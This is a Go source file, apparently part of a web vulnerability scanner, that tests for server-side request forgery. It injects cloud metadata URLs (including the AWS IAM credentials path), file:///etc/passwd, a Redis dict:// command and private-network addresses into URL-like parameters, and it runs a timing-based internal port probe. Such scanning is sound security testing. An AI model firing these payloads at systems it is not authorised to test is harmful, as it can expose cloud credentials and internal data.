package modules

import (
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ssrfURLParams are parameter name substrings that commonly accept URLs or
// paths — high-value targets for SSRF injection.
var ssrfURLParams = []string{
	"url", "uri", "src", "source", "href", "dest", "destination",
	"redirect", "target", "redir", "page", "path", "file",
	"fetch", "load", "next", "ref", "return", "link",
	"location", "host", "endpoint", "resource", "callback",
	"webhook", "proxy", "out_url",
}

// ssrfProbe is an internal address we try to hit via the target server.
type ssrfProbe struct {
	Payload string
	Label   string
	// markers are strings we expect to find in the response if the server
	// successfully fetched the resource (cloud metadata content, etc.)
	Markers []string
}

var ssrfProbes = []ssrfProbe{
	// AWS EC2 Instance Metadata Service (IMDSv1 — most common)
	{
		Payload: "http://169.254.169.254/latest/meta-data/",
		Label:   "AWS IMDS v1",
		Markers: []string{"ami-id", "instance-id", "security-credentials", "iam", "hostname"},
	},
	// AWS IMDSv2 (token required, but try anyway — some misconfigs allow it)
	{
		Payload: "http://169.254.169.254/latest/meta-data/iam/",
		Label:   "AWS IMDS IAM",
		Markers: []string{"security-credentials", "iam"},
	},
	// GCP metadata
	{
		Payload: "http://metadata.google.internal/computeMetadata/v1/",
		Label:   "GCP Metadata",
		Markers: []string{"computeMetadata", "instance", "project"},
	},
	// Azure IMDS
	{
		Payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		Label:   "Azure IMDS",
		Markers: []string{"vmId", "subscriptionId", "resourceGroupName", "azEnvironment"},
	},
	// Localhost probing
	{
		Payload: "http://localhost/",
		Label:   "Localhost HTTP",
		Markers: []string{}, // detected by error leakage or response anomaly
	},
	{
		Payload: "http://127.0.0.1/",
		Label:   "Loopback HTTP",
		Markers: []string{},
	},
	// Internal Redis
	{
		Payload: "dict://127.0.0.1:6379/INFO",
		Label:   "Redis dict://",
		Markers: []string{"redis_version", "tcp_port", "uptime_in_seconds"},
	},
	// File protocol
	{
		Payload: "file:///etc/passwd",
		Label:   "file:///etc/passwd",
		Markers: []string{"root:x:", "nobody:x:", "/bin/bash", "/sbin/nologin"},
	},
	{
		Payload: "file:///etc/hostname",
		Label:   "file:///etc/hostname",
		Markers: []string{}, // any non-empty different response
	},
	// Internal subnet ranges
	{
		Payload: "http://192.168.1.1/",
		Label:   "Private range 192.168.1.1",
		Markers: []string{"router", "admin", "password", "login"},
	},
	{
		Payload: "http://10.0.0.1/",
		Label:   "Private range 10.0.0.1",
		Markers: []string{"router", "admin", "login"},
	},
}

// ssrfErrorMarkers are strings that appear in server responses when the
// backend tries (and fails) to connect to an internal address — still
// evidence of SSRF even if data isn't returned.
var ssrfErrorMarkers = []string{
	"connection refused",
	"failed to connect",
	"could not connect",
	"no route to host",
	"network is unreachable",
	"name or service not known",
	"getaddrinfo failed",
	"dial tcp",
	"curl: (",
	"fsockopen",
	"unable to connect",
	"request to http://127",
	"request to http://169",
	"request to http://10.",
	"request to http://192.168",
	"http://localhost",
	"http://127.0.0.1",
	"http://169.254.169.254",
}

// isSSRFParam returns true if the parameter name suggests it might accept a
// URL or resource path.
func isSSRFParam(param string) bool {
	low := strings.ToLower(param)
	for _, kw := range ssrfURLParams {
		if strings.Contains(low, kw) {
			return true
		}
	}
	return false
}

// ScanSSRF attempts to detect Server-Side Request Forgery vulnerabilities by
// injecting internal/cloud addresses into URL-like parameters and forms.
// Detection is in-band only (no OOB server required).
func ScanSSRF(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// ── URL parameters ─────────────────────────────────────────────────────
	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if !isSSRFParam(param) {
			if cfg.Verbose {
				output.Verbose("[ssrf] skip param=%s (not URL-like)", param)
			}
			continue
		}
		if cfg.Verbose {
			output.Verbose("[ssrf-get] param=%s", param)
		}

		// Baseline: use a known-safe value (not the original URL's raw value)
		// so we have a clean reference for comparison.
		safeURL, _ := core.SetParam(target.URL, param, "safe")
		baseline, _, err := core.DoGET(client, cfg, safeURL)
		if err != nil || baseline == "" {
			continue
		}

	SSRFURLLoop:
		for _, probe := range ssrfProbes {
			testURL, err := core.SetParam(target.URL, param, probe.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}

			bodyLow := strings.ToLower(body)

			// 1. Cloud metadata / file content markers
			for _, marker := range probe.Markers {
				if strings.Contains(bodyLow, strings.ToLower(marker)) &&
					!strings.Contains(strings.ToLower(baseline), strings.ToLower(marker)) {
					results = append(results, core.ScanResult{
						Type: "SSRF (Server-Side Request Forgery)",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: probe.Payload, Severity: "CRITICAL",
						Evidence:  fmt.Sprintf("[%s] marker %q in response (HTTP %d)", probe.Label, marker, status),
						Timestamp: time.Now(),
					})
					break SSRFURLLoop
				}
			}

			// 2. Error-leakage detection — server tried to connect and leaked the error
			for _, errMark := range ssrfErrorMarkers {
				if strings.Contains(bodyLow, errMark) && !strings.Contains(strings.ToLower(baseline), errMark) {
					results = append(results, core.ScanResult{
						Type: "SSRF (Error Leakage)",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: probe.Payload, Severity: "HIGH",
						Evidence:  fmt.Sprintf("[%s] error marker %q leaked in response (HTTP %d)", probe.Label, errMark, status),
						Timestamp: time.Now(),
					})
					break SSRFURLLoop
				}
			}
		}

		// Timing-based fallback for parameters with no in-band detection
		if !containsSSRFResult(results, target.URL, param) {
			if tr := ssrfTimingProbe(client, cfg, target.URL, param); tr != nil {
				results = append(results, *tr)
			}
		}
	}

	// ── Forms ──────────────────────────────────────────────────────────────
	for _, form := range target.Forms {
		for _, inp := range form.Inputs {
			if !isSSRFParam(inp.Name) {
				continue
			}
			if cfg.Verbose {
				output.Verbose("[ssrf-form] %s %s input=%s\n", form.Method, form.Action, inp.Name)
			}

			var baseline string
			var baseErr error
			if form.Method == "POST" {
				baseline, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
			} else {
				baseline, _, baseErr = core.DoGET(client, cfg, form.Action)
			}
			if baseErr != nil || baseline == "" {
				continue
			}

		SSRFFormLoop:
			for _, probe := range ssrfProbes {
				var body string
				var status int
				var err error

				if form.Method == "POST" {
					d := core.FormDefaults(form)
					d.Set(inp.Name, probe.Payload)
					body, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					d := core.FormDefaults(form)
					d.Set(inp.Name, probe.Payload)
					u, _ := core.SetFormParams(form.Action, d)
					body, status, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}

				bodyLow := strings.ToLower(body)

				for _, marker := range probe.Markers {
					if strings.Contains(bodyLow, strings.ToLower(marker)) &&
						!strings.Contains(strings.ToLower(baseline), strings.ToLower(marker)) {
						results = append(results, core.ScanResult{
							Type: "SSRF via core.Form (Server-Side Request Forgery)",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: probe.Payload, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("[%s] marker %q in response (HTTP %d)", probe.Label, marker, status),
							Timestamp: time.Now(),
						})
						break SSRFFormLoop
					}
				}

				for _, errMark := range ssrfErrorMarkers {
					if strings.Contains(bodyLow, errMark) && !strings.Contains(strings.ToLower(baseline), errMark) {
						results = append(results, core.ScanResult{
							Type: "SSRF via core.Form (Error Leakage)",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: probe.Payload, Severity: "HIGH",
							Evidence:  fmt.Sprintf("[%s] error marker %q leaked in response (HTTP %d)", probe.Label, errMark, status),
							Timestamp: time.Now(),
						})
						break SSRFFormLoop
					}
				}
			}

			// Timing-based fallback for form inputs with no in-band detection
			if !containsSSRFResult(results, form.Action, inp.Name) {
				if tr := ssrfTimingProbe(client, cfg, form.Action, inp.Name); tr != nil {
					results = append(results, *tr)
				}
			}
		}
	}

	return results
}

// containsSSRFResult checks if an SSRF finding already exists for a given
// parameter, so we don't duplicate timing-based results.
// It normalises both the stored URL and rawURL by stripping query strings
// so that payload-injected test URLs still match the original target.
func containsSSRFResult(results []core.ScanResult, rawURL, param string) bool {
	want := core.StripQuery(rawURL)
	for _, r := range results {
		if r.Parameter == param && strings.HasPrefix(r.Type, "SSRF") && core.StripQuery(r.URL) == want {
			return true
		}
	}
	return false
}

// ssrfTimingProbe performs a timing-based SSRF detection for a single
// parameter by comparing response times for open vs closed internal ports.
// Returns a core.ScanResult if a significant timing difference is detected.
func ssrfTimingProbe(client *http.Client, cfg *core.Config, rawURL, param string) *core.ScanResult {
	// Port 22 (SSH) is usually open on a server; port 1 is usually closed.
	// An SSRF vulnerability connecting to internal ports shows a difference.
	openPayload := "http://127.0.0.1:22/"
	closedPayload := "http://127.0.0.1:1/"

	urlOpen, _ := core.SetParam(rawURL, param, openPayload)
	urlClosed, _ := core.SetParam(rawURL, param, closedPayload)

	t0 := time.Now()
	core.DoGET(client, cfg, urlOpen) //nolint:errcheck
	openTime := time.Since(t0)

	t1 := time.Now()
	core.DoGET(client, cfg, urlClosed) //nolint:errcheck
	closedTime := time.Since(t1)

	diff := openTime - closedTime
	if diff < 0 {
		diff = -diff
	}

	// A >1s difference is a strong signal the backend is actually connecting
	if diff > time.Second {
		return &core.ScanResult{
			Type: "SSRF (Timing/Port-Scan)",
			URL:  urlOpen, Method: "GET", Parameter: param,
			Payload:   fmt.Sprintf("open: %s vs closed: %s", openPayload, closedPayload),
			Severity:  "HIGH",
			Evidence:  fmt.Sprintf("timing diff %v (open %v / closed %v)", diff.Round(time.Millisecond), openTime.Round(time.Millisecond), closedTime.Round(time.Millisecond)),
			Timestamp: time.Now(),
		}
	}
	return nil
}
